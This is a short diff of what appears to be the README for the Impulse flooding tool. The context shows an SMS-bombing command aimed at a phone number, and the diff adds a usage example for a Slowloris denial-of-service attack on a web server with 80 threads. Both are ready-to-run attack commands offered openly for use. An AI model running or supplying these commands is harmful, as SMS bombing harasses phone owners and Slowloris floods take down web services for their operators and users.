@@ -15,4 +15,7 @@ https://github.com/LimerBoy/Impulse via git clone https://github.com/LimerBoy/Im
 impulse --method SMS --time 20 --threads 16 --target +7999999999
 ```
 
-
+##### DOS a web server using Slowloris attack (keep sockets open sending keep-alive headers)
+```
+impulse --threads 80 --target https://scanme.nmap.org --method slowloris --time 30
+```
